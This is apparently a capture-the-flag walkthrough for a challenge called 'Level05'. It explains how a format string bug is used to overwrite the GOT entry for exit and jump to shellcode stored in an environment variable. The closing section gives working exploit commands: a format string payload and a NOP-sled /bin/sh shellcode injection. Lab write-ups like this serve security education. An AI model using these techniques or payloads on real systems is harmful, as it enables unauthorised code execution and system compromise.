# Level05

## Vulnerability type:

Format String Vulnerability, Return-to-Libc (RET2LIBC)

## Walkthrough:

The program has a Format String Vulnerability, and it also calls the `exit` function. We can use this to our advantage by modifying the Global Offset Table (GOT) entry for `exit` to redirect program flow.

The issue here is that the program is applying a `to_lowercase` function on the buffer and it impacts the shell code we injected.

To bypass that, need to store the shellcode inside an environment variable and access it from the program. By using the `env -i` command (start with empty env) and a NOP sled, we increase our chances to reach the shellcode.

## Payload:

### Format string vuln. exploit

```bash
python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%56942x %10$n" + "%8593x %11$n"' > /tmp/05
```

### Shellcode injection

```bash
$ cat /tmp/05 - | env -i SHELLCODE=$(python -c "print('\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')") ./level05
```
